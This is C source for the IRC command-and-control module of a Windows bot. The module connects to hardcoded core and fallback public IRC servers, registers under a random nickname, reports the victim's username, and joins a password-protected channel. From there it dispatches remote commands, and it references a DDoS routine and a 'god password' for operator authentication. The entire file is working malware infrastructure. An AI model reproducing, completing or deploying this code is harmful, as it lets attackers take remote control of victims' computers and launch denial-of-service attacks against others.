#include "StdAfx.h"

/// Globals

char *emergency_irc_servers[] = { "irc.inet.tele.dk", "efnet.demon.co.uk", "irc.avalonworks.ca" };
//char *core_servers[] = {"syn2k.net","syn2k.net"};
char *core_servers[] = { "192.168.190.129", "192.168.190.129" };

int core_servers_num = 1;
int emergency_servers_num = 3;
int	wcon_tryes = 0;
int Emergency = 0;
char current_server[85];
char AuthenticatedHost[255];

WORD rawmsgs_num = 0;
char rawmsgs[MAX_LOG_MESSAGES][255];

WORD QuitIRC = 0;
WORD Reconnect = 0;

CRITICAL_SECTION  cs;
WORD logmsgs_num = 0;
char logmsgs[MAX_LOG_MESSAGES][255];
char IrcNick[IRC_NICK_LEN];
char main_password[128];
extern int inet_alive;

/// irc core

DWORD WINAPI CoreIrc(LPVOID lpParam)
{
	WSADATA wsaData;
	SOCKET s_irc;
	sockaddr_in sin;
	char RecvBuf[IRC_RECVBUF_SIZE], OutBuf[IRC_RECVBUF_SIZE];
	char sDest[64];
	WORD Tryes = 0, CoreIrcPort;
	int BytesRead = 0;
	DWORD Registered = 0;
	WORD SentFlag = 0;
	time_t lastpingtime, curtime;
	char szUserName[UNLEN+1];

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if(iResult!=NO_ERROR)
	{
		deb("Error at WSAStartup()\n");
		ExitThread(ERR);
	}
	srand((unsigned)time(NULL));
	InitializeCriticalSection(&cs);

	CoreIrcPort = CORE_IRC_PORT;

	logmsgs_num = 0;
	/// IRC REGISTRATION START
Irc_Register:

	deb("irc: waiting for inet connection...");
	while(!inet_alive)
		Sleep(1000);
	deb("irc: got connection...");

	/* -------------------------------------- if exist, read core servers from registry */
	GetCoreServers(core_servers, &CoreIrcPort);
	/* -------------------------------------- read god password */
	if(RegistryGetSetting("code", main_password, sizeof(main_password))>0)
	{
		deb("read password from registry: %s", main_password);
	}
	else
	{
		deb("setting default password: %s", GOD_PASSWORD);
		strncpy(main_password, GOD_PASSWORD, sizeof(main_password));
	}

	if(wcon_tryes>MAX_CORE_SERVERS_CONNECT_TRYES)
	{
		deb("connecting to emergency servers.");
		strncpy(current_server, emergency_irc_servers[rand()%emergency_servers_num], sizeof(current_server));
		Emergency = 1;
	}
	else
	{
		deb("connecting to core servers.[%s]", core_servers[0]);
		strncpy(current_server, core_servers[0], sizeof(current_server));
		Emergency = 0;
	}

	s_irc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s_irc==INVALID_SOCKET)
	{
		deb("Error at socket(): %ld\n", WSAGetLastError());
		WSACleanup();
		ExitThread(ERR);
	}

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = DnsResolve(current_server);
	sin.sin_port = htons(Emergency ? 6667 : CoreIrcPort);

	deb("Emergency: %d wcon: %d server: %s:%d", Emergency, wcon_tryes, current_server, ntohs(sin.sin_port));

	IdentServer(ENABLE, IrcNick);

	if(connect(s_irc, (SOCKADDR*)&sin, sizeof(sin))==SOCKET_ERROR)
	{
		deb("Failed to connect to %s [%s/%d]. %s (WSA:%d)\n",
			current_server, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port), FORMATERROR, WSAGetLastError());
		closesocket(s_irc);
		IdentServer(DISABLE);
		if(!ddos_running()) wcon_tryes++;
		Sleep(CONNECT_SLEEP);
		goto Irc_Register;
	}

	deb("Connected to server.\n");

	while(rtr(s_irc, 2)==SUCCESS) {
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);
			if(!ddos_running()) wcon_tryes++;
			goto Irc_Register;
		}
		RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);
	}

	_snprintf(RecvBuf, IRC_RECVBUF_SIZE, "PASS asdgasdf\n");
	deb("sending %s\n", RecvBuf);
	send(s_irc, RecvBuf, strlen(RecvBuf), 0);
	if(rtr(s_irc, 1)==SUCCESS)
	{
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			closesocket(s_irc);
			Registered = 0;
			if(!ddos_running()) wcon_tryes++;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);
			goto Irc_Register;
		}
		if(BytesRead>0)
			RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);
	}
Irc_nick:
	deb(" registering nick  \n");

	_snprintf(RecvBuf, IRC_RECVBUF_SIZE, "NICK %s\n", IrcNick);
	deb("sending %s\n", RecvBuf);
	send(s_irc, RecvBuf, strlen(RecvBuf), 0);
	Sleep(500);

	while(rtr(s_irc, 1)==SUCCESS)
	{
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			closesocket(s_irc);
			Registered = 0;
			if(!ddos_running())
				wcon_tryes++;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);
			goto Irc_Register;
		}
		if(BytesRead>0)
			RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);
		if(strstr(RecvBuf, "433"))
		{
			deb("nickname in use\n");
			memset(IrcNick, 0x0, sizeof(IrcNick));
			GetRandStr(sizeof(IrcNick)-1, IrcNick);
			memcpy(IrcNick, IRC_NICK_PREFIX, sizeof(IRC_NICK_PREFIX)-1);
			goto Irc_nick;
		}
	}

	deb(" registering user \n");

	DWORD u_size = UNLEN+1;
	if(GetUserName(szUserName, &u_size)==0)
		strncpy(szUserName, IRC_REALNAME, UNLEN+1);
	_snprintf(RecvBuf, IRC_RECVBUF_SIZE, "USER %s 8 *: %s\n", IrcNick, szUserName);
	deb("sending %s\n", RecvBuf);

	send(s_irc, RecvBuf, strlen(RecvBuf), 0);
	if(rtr(s_irc, 1)==SUCCESS)
	{
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);
			if(!ddos_running()) wcon_tryes++;
			Sleep(CONNECT_SLEEP);
			goto Irc_Register;
		}
		if(BytesRead>0)
			RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);
	}

	char *p;
	char szTemp[128];

	if(p = strstr(RecvBuf, "PING"))
	{
		sscanf(RecvBuf, "PING %s", szTemp);
		_snprintf(RecvBuf, 200, "PONG %s\n", szTemp);
		send(s_irc, RecvBuf, strlen(RecvBuf), 0);
	}

	_snprintf(szTemp, 150, ":%s 376", current_server);
	deb("waiting for %s\n", szTemp);

	char szError[128];
	wsprintf(szError, ":%s 451", current_server);

	while(rtr(s_irc, 2)==SUCCESS) 
	{
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);

			if(!ddos_running()) 
				wcon_tryes++;

			goto Irc_Register;
		}

		RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);

		if(strstr(RecvBuf, szTemp))
			break;

		if(strstr(RecvBuf, szError))
		{
			deb("Registration error...\n");
			
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);

			if(!ddos_running()) 
				wcon_tryes++;

			Sleep(CONNECT_SLEEP);
			goto Irc_Register;
		}
	}

	/// client registered
	deb("got motd\n");
	Sleep(1000);

	char irc_channel[20], secret_irc_key[20];

	strcpy(irc_channel, IRC_CHANNEL);
	strcpy(secret_irc_key, SECRET_IRC_KEY);

	_snprintf(RecvBuf, IRC_RECVBUF_SIZE, "JOIN #%s %s\n", irc_channel, secret_irc_key);
	deb("sending %s\n", RecvBuf);
	send(s_irc, RecvBuf, strlen(RecvBuf), 0);

	if(rtr(s_irc, 1)==SUCCESS)
	{
		BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
		if(BytesRead==SOCKET_ERROR||BytesRead==0)
		{
			deb("connection closed by remote\nRestoring connection..\n", BytesRead);
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);
			if(!ddos_running()) wcon_tryes++;
			goto Irc_Register;
		}
		if(strstr(RecvBuf, szError))
		{
			deb("Registration error...\n");
			closesocket(s_irc);
			Registered = 0;
			IdentServer(DISABLE);
			Sleep(CONNECT_SLEEP);
			goto Irc_Register;
		}
		if(BytesRead>0)
			RecvBuf[BytesRead] = 0x0;
		deb("RECV [%d]:\n%s\n", BytesRead, RecvBuf);
	}

	/// on channel, dispatch commands

	deb("Entering message loop\n");
	char prev_msg[128] = "";
	char *msgp;
	IdentServer(DISABLE);
	time(&lastpingtime);
	wcon_tryes = 0;

	while(1)
	{
		/// reconnect
		if(Reconnect) 
		{
			closesocket(s_irc);
			Reconnect = 0;
			goto Irc_Register;
		}
		/// if there is a messages awaiting to send - send _ONE_
		if(logmsgs_num)
		{
			deb("logmsgs: %d\n", logmsgs_num);

			logmsgs_num--;
			if(*prev_msg && strncmp(prev_msg, logmsgs[logmsgs_num], MAX_DUPLICATE_CHARS)==0)
			{
				deb("skipped: %s\n", logmsgs[logmsgs_num]);
				//continue;
			}

			deb("send: %s\n", logmsgs[logmsgs_num]);

			strncpy(OutBuf, logmsgs[logmsgs_num], IRC_OUTBUF_SIZE);
			strncpy(prev_msg, logmsgs[logmsgs_num], 128);
			strncpy(sDest, "#", 2);
			strcat(sDest, IRC_CHANNEL);

			if(GenerateAndSendMessage(OutBuf, IRC_OUTBUF_SIZE, sDest, s_irc)==SOCKET_ERROR)
			{
				deb("connection closed by remote\nRestoring connection..\n", BytesRead);

				closesocket(s_irc);
				Registered = 0;
				goto Irc_Register;
			}
			//*prev_msg = 0x0;
		}
		/* if there is raw messages - send it all */
		EnterCriticalSection(&cs);
		if(rawmsgs_num)
		{
			deb("rawmsgs: %d\n", rawmsgs_num);
			while(rawmsgs_num)
			{
				rawmsgs_num--;
				deb("send: '%s'\n", rawmsgs[rawmsgs_num]);
				strncpy(OutBuf, rawmsgs[rawmsgs_num], IRC_OUTBUF_SIZE);
				send(s_irc, OutBuf, lstrlen(OutBuf), 0);
			}
		}
		LeaveCriticalSection(&cs);
		/// if quit flag changes - quit irc
		if(QuitIRC) {
			sprintf(RecvBuf, "QUIT :.\n");
			send(s_irc, RecvBuf, strlen(RecvBuf), 0);
			BytesRead = SockReadAll(s_irc, RecvBuf, IRC_RECVBUF_SIZE, IRC_MSG_TIMEOUT);
			closesocket(s_irc);
			WSACleanup();
			deb("bye bye irc\n");
			ExitThread(SUCCESS);
		}
		/// if s_irc want to tell us something..
		if(ReadyToRead(s_irc, 1)==SUCCESS) {
			time(&lastpingtime);
			memset(RecvBuf, 0x0, IRC_RECVBUF_SIZE);
			BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
			if(BytesRead==SOCKET_ERROR||BytesRead==0)
			{
				deb("connection closed by remote\nRestoring connection..\n", BytesRead);
				closesocket(s_irc);
				Registered = 0;
				goto Irc_Register;
			}
			RecvBuf[BytesRead] = 0x0;
			//deb("In[%d]: %s\n",BytesRead,RecvBuf);

			/* bla */
			msgp = strtok(RecvBuf, "\n");
			if(msgp)
			{
				//deb("FIRST TOKEN: %s", msgp);
				memset(OutBuf, 0x0, IRC_OUTBUF_SIZE);
				DispatchIrcCommand(msgp, OutBuf, IRC_OUTBUF_SIZE, &SentFlag);

				if(SentFlag==SEND_MSG_TO_RECIEVER) {
					udpdeb("%s", OutBuf);
					IrcGetRespondValue(msgp, sDest, 64);
					if(GenerateAndSendMessage(OutBuf, IRC_OUTBUF_SIZE, sDest, s_irc)
						==SOCKET_ERROR) {
						deb("genandsend in  main_loop returned %d \nRestoring connection..\n",
							BytesRead);
						closesocket(s_irc);
						Registered = 0;
						goto Irc_Register;
					}
				}
				else if(SentFlag==SEND_MSG_DIRECT)
				{
					//deb("Reply msg:\n%s\n",OutBuf);
					send(s_irc, OutBuf, strlen(OutBuf), 0);
				}
			}
			while((msgp = strtok(NULL, "\n")))
			{
				//deb("TOKEN: %s", msgp);
				memset(OutBuf, 0x0, IRC_OUTBUF_SIZE);
				DispatchIrcCommand(msgp, OutBuf, IRC_OUTBUF_SIZE, &SentFlag);

				if(SentFlag==SEND_MSG_TO_RECIEVER)
				{
					IrcGetRespondValue(msgp, sDest, 64);
					if(GenerateAndSendMessage(OutBuf, IRC_OUTBUF_SIZE, sDest, s_irc)==SOCKET_ERROR)
					{
						deb("genandsend in  main_loop returned %d \nRestoring connection..\n", BytesRead);
						closesocket(s_irc);
						Registered = 0;
						goto Irc_Register;
					}
				}
				else if(SentFlag==SEND_MSG_DIRECT)
				{
					deb("Reply msg:\n%s\n", OutBuf);
					send(s_irc, OutBuf, strlen(OutBuf), 0);
				}
			}
		}
		/// check that server is still alive and connection not stalled.
		time(&curtime);
		if((curtime-lastpingtime)>IRC_PING_DELAY_SECONDS)
		{
			_snprintf(OutBuf, IRC_OUTBUF_SIZE, "PING %s\n", current_server);
			if(send(s_irc, OutBuf, strlen(OutBuf), 0)==SOCKET_ERROR)
			{
				deb("write error: broken pipe. reconnecting to server..\n");
				closesocket(s_irc);
				Registered = 0;
				goto Irc_Register;
			}
			if(ReadyToRead(s_irc, IRC_PING_AWAIT_SECONDS)==SUCCESS)
			{
				memset(RecvBuf, 0x0, IRC_RECVBUF_SIZE);
				BytesRead = recv(s_irc, RecvBuf, IRC_RECVBUF_SIZE, 0);
				if(BytesRead==SOCKET_ERROR||BytesRead==0)
				{
					deb("BytesRead in  main_loop returned %d \nRestoring connection..\n", BytesRead);
					closesocket(s_irc);
					Registered = 0;
					goto Irc_Register;
				}
				sscanf(RecvBuf, "%*s %5s", OutBuf);
				if(memcmp(OutBuf, "PONG", 4)==0)
				{
					time(&lastpingtime);
				}
				else
				{
					RecvBuf[BytesRead] = 0x0;
					deb("Err: on PING i got: %s\n", RecvBuf);
					closesocket(s_irc);
					Registered = 0;
					goto Irc_Register;
				}
			}
			else
			{
				deb("connection to server has staled. restoring connection..\n");
				closesocket(s_irc);
				Registered = 0;
				goto Irc_Register;
			}
		}
	}

	ExitThread(SUCCESS);
}

WORD IrcGetRespondValue(char* recvBuf, char* value, WORD maxvalue)
{
	char Cmd[1024], RemUser[128], IrcCmd[64], Dest[64], remNick[64];

	sscanf(recvBuf, "%128s %64s %64s :%[^\n\r]", RemUser, IrcCmd, Dest, Cmd);
	if(strstr(Dest, "#"))
	{
		strncpy(value, Dest, maxvalue);
	}
	else
	{
		sscanf(RemUser, ":%64[^!]", remNick);
		strncpy(value, remNick, maxvalue);
	}

	return SUCCESS;
}

int GenerateAndSendMessage(char *inBuf, DWORD dwbufsiz, char *sDest, SOCKET socket)
{
	char tmpBuf[INTERNAL_TEMP_BUF], msgStr[255], *ip, *tp;
	char *sMsg;
	DWORD msgSize = 0, inBufSize, msgStrlen;
	BYTE MsgLen = 0;

	strcat(inBuf, "\n");
	sprintf(msgStr, "PRIVMSG %s :", sDest);
	msgStrlen = strlen(msgStr);
	strncpy(tmpBuf, msgStr, INTERNAL_TEMP_BUF);
	msgSize = strlen(tmpBuf);
	inBufSize = strlen(inBuf);
	ip = inBuf;
	tp = tmpBuf+msgStrlen;
	sMsg = tmpBuf;

	while(*ip) 
	{
		if(*ip=='\n'||*ip=='\r') 
		{
			while(*ip++) 
			{
				if(*ip!='\n' && *ip!='\r')
					break;
			}
			if(*ip) 
			{
				strcat(tp, "\n");
				if(MsgLen>0) 
				{
					if(send(socket, sMsg, MsgLen+msgStrlen+1, 0)==SOCKET_ERROR)
						return SOCKET_ERROR;
					Sleep(IRC_MSG_DELAY);
				}
				sMsg = tp+1;
				MsgLen = 0;
				strcat(tp, msgStr);
				tp += msgStrlen+1;
				continue;
			}
		}
		else 	
		{
			MsgLen++;
			*tp = *ip;
			*(tp+1) = 0x0;
			tp++;
			ip++;
		}
	}

	return SUCCESS;
}